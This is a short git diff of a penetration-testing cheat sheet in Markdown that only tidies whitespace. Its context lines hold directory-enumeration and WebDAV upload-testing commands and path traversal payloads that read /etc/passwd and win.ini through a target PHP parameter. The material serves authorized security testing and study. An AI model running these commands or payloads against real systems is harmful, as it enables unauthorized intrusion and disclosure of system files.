@@ -272,11 +272,8 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
 
     ```bash
     nmap -sV -p 80,443 --script=http-webdav-scan # Confirm that WebDav is enabled
-
     curl -X OPTIONS http://<target_ip>/webdav # Check options allowed
-
     davtest -url http://<target_ip>/webdav # Test file upload
-
     ```
 
     > Usually, file upload through WebDav requires a valid credential, which might need to conduct brute force attack or find leaked credentials from other places
@@ -291,7 +288,7 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
       curl "http://<target_ip>/<target_php>?<parameter>=../../../../etc/passwd" # Linux Based Server
       curl "http://<target_ip>/<target_php>?=../../../../windows/win.ini"  # Windows Based Server
       ```
-      
+
       - Path Traversal Payload Reference
 
       | Target File                           | OS      | Objective                                 |
